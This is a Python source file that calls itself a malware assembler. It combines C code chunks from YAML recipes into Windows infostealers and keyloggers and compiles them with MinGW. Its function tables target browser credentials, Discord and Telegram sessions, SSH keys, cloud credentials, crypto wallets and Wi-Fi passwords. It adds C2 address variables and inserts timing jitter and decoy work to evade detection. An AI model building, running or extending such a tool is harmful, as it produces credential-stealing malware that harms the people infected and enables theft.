#!/usr/bin/env python3
"""Assembles malware from chunk recipes.

Usage:
    python assembler.py recipes/infostealer_full.yaml -o /tmp/output.c
    python assembler.py recipes/infostealer_full.yaml -o /tmp/output.c --compile
    python assembler.py recipes/keylogger.yaml -o /tmp/output.c --compile --var C2_IP=10.0.2.2

Reads a recipe YAML, resolves chunk dependencies, concatenates into a single
compilable .c file with proper ordering, and optionally compiles with MinGW.
"""

import argparse
import os
import re
import subprocess
import sys
from pathlib import Path

try:
    import yaml
except ImportError:
    print("pyyaml required: pip install pyyaml", file=sys.stderr)
    sys.exit(1)

CHUNKS_DIR = Path(__file__).parent


def parse_chunk_metadata(chunk_path: Path) -> dict:
    meta = {"depends": [], "provides": [], "headers": [], "libs": []}
    if not chunk_path.exists():
        return meta
    with open(chunk_path) as f:
        for line in f:
            line = line.strip()
            if not line.startswith("//"):
                break
            if line.startswith("// depends:"):
                deps = line.split(":", 1)[1].strip()
                if deps != "(none)":
                    meta["depends"] = [d.strip() for d in deps.split(",")]
            elif line.startswith("// provides:"):
                meta["provides"] = [p.strip() for p in line.split(":", 1)[1].strip().split(",")]
            elif line.startswith("// headers:"):
                meta["headers"] = [h.strip() for h in line.split(":", 1)[1].strip().split(",")]
            elif line.startswith("// libs:"):
                meta["libs"] = [l.strip() for l in line.split(":", 1)[1].strip().split(",")]
    return meta


def resolve_chunk_path(chunk_ref: str) -> Path:
    p = CHUNKS_DIR / f"{chunk_ref}.c"
    if p.exists():
        return p
    p = CHUNKS_DIR / f"{chunk_ref}.h"
    if p.exists():
        return p
    raise FileNotFoundError(f"Chunk not found: {chunk_ref} (tried {CHUNKS_DIR / chunk_ref}.[ch])")


def read_chunk_body(chunk_path: Path) -> str:
    lines = []
    in_body = False
    chunk_guard_depth = 0
    with open(chunk_path) as f:
        for line in f:
            stripped = line.strip()
            if not in_body:
                if stripped.startswith("//"):
                    continue
                in_body = True
            if stripped.startswith("#ifndef CHUNK_"):
                chunk_guard_depth += 1
                continue
            if stripped.startswith("#define CHUNK_"):
                continue
            lines.append(line)

    if chunk_guard_depth > 0 and lines and lines[-1].strip() == "#endif":
        lines.pop()
    while lines and lines[-1].strip() == "":
        lines.pop()
    while lines and lines[0].strip() == "":
        lines.pop(0)

    return "".join(lines)


def build_collector_calls(collectors: list[str]) -> str:
    calls = []
    fn_map = {
        "collectors/system_info": "collect_system_info",
        "collectors/system_info_stealth": "collect_system_info",
        "collectors/processes": "collect_processes",
        "collectors/installed_software": "collect_installed_software",
        "collectors/env_vars": "collect_env_vars",
        "collectors/clipboard": "collect_clipboard",
        "collectors/wifi_passwords": "collect_wifi",
        "collectors/browser_chromium": "collect_browsers",
        "collectors/discord_tokens": "collect_discord",
        "collectors/telegram_session": "collect_telegram",
        "collectors/ftp_credentials": "collect_ftp_clients",
        "collectors/ssh_keys": "collect_ssh_git",
        "collectors/cloud_creds": "collect_cloud_creds",
        "collectors/crypto_wallets": "collect_crypto_wallets",
        "collectors/screenshot": "collect_screenshot",
        "collectors/keylogger": "collect_keystrokes",
    }
    for c in collectors:
        fn = fn_map.get(c, c.split("/")[-1])
        calls.append(f"    {fn}();")
    return "\n".join(calls)


def build_staged_calls(collectors: list[str]) -> str:
    calls = []
    fn_map = {
        "collectors/system_info": "collect_system_info",
        "collectors/system_info_stealth": "collect_system_info",
        "collectors/processes": "collect_processes",
        "collectors/installed_software": "collect_installed_software",
        "collectors/env_vars": "collect_env_vars",
        "collectors/clipboard": "collect_clipboard",
        "collectors/wifi_passwords": "collect_wifi",
        "collectors/browser_chromium": "collect_browsers",
        "collectors/discord_tokens": "collect_discord",
        "collectors/telegram_session": "collect_telegram",
        "collectors/ftp_credentials": "collect_ftp_clients",
        "collectors/ssh_keys": "collect_ssh_git",
        "collectors/cloud_creds": "collect_cloud_creds",
        "collectors/crypto_wallets": "collect_crypto_wallets",
        "collectors/screenshot": "collect_screenshot",
        "collectors/keylogger": "collect_keystrokes",
    }
    for i, c in enumerate(collectors):
        fn = fn_map.get(c, c.split("/")[-1])
        calls.append(f"    {fn}();")
        if i < len(collectors) - 1:
            calls.append(f"    jitter_sleep(1000, 5000);")
    return "\n".join(calls)


def build_paced_calls(collectors: list[str]) -> str:
    fn_map = {
        "collectors/system_info": "collect_system_info",
        "collectors/system_info_stealth": "collect_system_info",
        "collectors/processes": "collect_processes",
        "collectors/installed_software": "collect_installed_software",
        "collectors/env_vars": "collect_env_vars",
        "collectors/clipboard": "collect_clipboard",
        "collectors/wifi_passwords": "collect_wifi",
        "collectors/browser_chromium": "collect_browsers",
        "collectors/discord_tokens": "collect_discord",
        "collectors/telegram_session": "collect_telegram",
        "collectors/ftp_credentials": "collect_ftp_clients",
        "collectors/ssh_keys": "collect_ssh_git",
        "collectors/cloud_creds": "collect_cloud_creds",
        "collectors/crypto_wallets": "collect_crypto_wallets",
        "collectors/screenshot": "collect_screenshot",
    }
    calls = []
    for i, c in enumerate(collectors):
        fn = fn_map.get(c, c.split("/")[-1])
        calls.append(f"    {fn}();")
        calls.append(f"    pace(300, 300);")
        if i % 2 == 0:
            calls.append(f"    decoy_work();")
    return "\n".join(calls)


def build_fn_list(collectors: list[str]) -> str:
    fn_map = {
        "collectors/system_info": "collect_system_info",
        "collectors/system_info_stealth": "collect_system_info",
        "collectors/processes": "collect_processes",
        "collectors/installed_software": "collect_installed_software",
        "collectors/env_vars": "collect_env_vars",
        "collectors/clipboard": "collect_clipboard",
        "collectors/wifi_passwords": "collect_wifi",
        "collectors/browser_chromium": "collect_browsers",
        "collectors/discord_tokens": "collect_discord",
        "collectors/telegram_session": "collect_telegram",
        "collectors/ftp_credentials": "collect_ftp_clients",
        "collectors/ssh_keys": "collect_ssh_git",
        "collectors/cloud_creds": "collect_cloud_creds",
        "collectors/crypto_wallets": "collect_crypto_wallets",
        "collectors/screenshot": "collect_screenshot",
        "collectors/keylogger": "collect_keystrokes",
    }
    fns = []
    for c in collectors:
        fn = fn_map.get(c, c.split("/")[-1])
        fns.append(f"        (collector_fn){fn},")
    return "\n".join(fns)


def assemble(recipe_path: str, extra_vars: dict | None = None) -> str:
    with open(recipe_path) as f:
        recipe = yaml.safe_load(f)

    vars_dict = recipe.get("vars", {})
    if extra_vars:
        vars_dict.update(extra_vars)

    all_chunks = []
    if recipe.get("api_resolve"):
        all_chunks.append(recipe["api_resolve"])
    all_chunks.extend(recipe.get("evasion", []))
    if recipe.get("process"):
        all_chunks.append(recipe["process"])
    all_chunks.extend(recipe.get("core", []))
    all_chunks.extend(recipe.get("collectors", []))
    if recipe.get("keylogger"):
        all_chunks.append(recipe["keylogger"])
    all_chunks.append(recipe["exfil"])
    if recipe.get("persist"):
        all_chunks.append(recipe["persist"])
    all_chunks.append(recipe["arch"])

    seen_headers = set()
    all_headers = []
    all_libs = set()
    bodies = []

    for chunk_ref in all_chunks:
        path = resolve_chunk_path(chunk_ref)
        meta = parse_chunk_metadata(path)
        for h in meta["headers"]:
            if h not in seen_headers:
                seen_headers.add(h)
                all_headers.append(h)
        all_libs.update(meta["libs"])
        bodies.append(f"/* ── {chunk_ref} ── */\n")
        bodies.append(read_chunk_body(path))
        bodies.append("\n\n")

    base_headers = ["winsock2.h", "windows.h", "ws2tcpip.h", "stdio.h", "stdlib.h", "string.h", "stdarg.h"]
    final_headers = []
    for h in base_headers:
        if h not in seen_headers:
            seen_headers.add(h)
        final_headers.append(h)
    for h in all_headers:
        if h not in final_headers:
            final_headers.append(h)

    output_parts = []
    for h in final_headers:
        output_parts.append(f"#include <{h}>")
    output_parts.append("")

    output_parts.append("")

    for k, v in vars_dict.items():
        if k not in ("C2_IP", "C2_PORT"):
            output_parts.append(f"#define {k} {v}")
    output_parts.append("")

    source = "\n".join(output_parts) + "\n" + "".join(bodies)

    collectors = recipe.get("collectors", [])
    source = source.replace("{{COLLECTOR_CALLS}}", build_collector_calls(collectors))
    source = source.replace("{{STAGED_COLLECTOR_CALLS}}", build_staged_calls(collectors))
    source = source.replace("{{COLLECTOR_FN_LIST}}", build_fn_list(collectors))
    source = source.replace("{{KEYLOG_COLLECTOR_CALLS}}", build_paced_calls(collectors))

    for k, v in vars_dict.items():
        source = source.replace(f"{{{{{k}}}}}", str(v))

    return source


def compile_mingw(source_path: str, output_path: str) -> bool:
    cmd = [
        "x86_64-w64-mingw32-gcc",
        "-mwindows",
        "-o", output_path,
        source_path,
        "-lws2_32", "-liphlpapi", "-lcrypt32", "-lole32", "-lshell32", "-lgdi32",
        "-lwininet", "-ldnsapi", "-ladvapi32", "-luser32",
        "-static",
    ]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        if result.returncode != 0:
            print(f"Compile error:\n{result.stderr}", file=sys.stderr)
            return False
        size = os.path.getsize(output_path)
        print(f"Compiled: {output_path} ({size} bytes)")
        return True
    except FileNotFoundError:
        print("x86_64-w64-mingw32-gcc not found", file=sys.stderr)
        return False


def main():
    parser = argparse.ArgumentParser(description="Assemble malware from chunk recipes")
    parser.add_argument("recipe", help="Path to recipe YAML file")
    parser.add_argument("-o", "--output", default="/tmp/assembled.c", help="Output .c file path")
    parser.add_argument("--compile", action="store_true", help="Also compile with MinGW")
    parser.add_argument("--var", action="append", default=[], help="Override var: --var C2_IP=1.2.3.4")

    args = parser.parse_args()

    extra_vars = {}
    for v in args.var:
        if "=" in v:
            k, val = v.split("=", 1)
            extra_vars[k] = val

    source = assemble(args.recipe, extra_vars)

    with open(args.output, "w") as f:
        f.write(source)
    print(f"Assembled: {args.output} ({len(source)} chars)")

    if args.compile:
        exe_path = args.output.replace(".c", ".exe")
        compile_mingw(args.output, exe_path)


if __name__ == "__main__":
    main()
